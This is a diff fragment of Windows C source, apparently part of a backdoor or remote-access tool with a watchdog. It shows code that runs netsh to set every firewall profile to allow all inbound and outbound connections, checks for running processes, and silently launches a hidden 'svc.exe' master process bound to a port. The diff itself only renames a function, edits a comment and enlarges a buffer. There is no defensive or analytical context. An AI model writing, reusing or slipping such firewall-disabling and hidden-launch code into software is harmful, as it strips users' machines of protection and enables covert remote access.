@@ -13,14 +13,14 @@ int ProcessExists(const wchar_t *name) {
     int found = 0;
     if (Process32FirstW(snap, &pe)) {
         do {
-            if (_wcsicmp(pe.szExeFile, name) == 0) { found = 1; break; }
+            if (wcsicmp(pe.szExeFile, name) == 0) { found = 1; break; }
         } while (Process32NextW(snap, &pe));
     }
     CloseHandle(snap);
     return found;
 }
 
-// 关闭防火墙（允许所有入站/出站连接）?? 阻塞等待执行完成
+// 关闭防火墙（允许所有入站/出站连接） 阻塞等待执行完成
 void ConfigureFirewall() {
     WCHAR cmd[] = L"C:\\Windows\\System32\\netsh.exe advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound";
     STARTUPINFOW si = { sizeof(si) };
@@ -47,7 +47,7 @@ void StartMaster() {
     si.wShowWindow = SW_HIDE;
 
     // 命令行格式：svc.exe "<看门狗路径>" <端口>
-    WCHAR cmd[512];
+    static WCHAR cmd[65536];
     wsprintfW(cmd, L"\"%s\" \"%s\" %d", MASTER_PATH, selfPath, DEFAULT_PORT);
     if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         // 不等待子进程，直接关闭句柄并返回
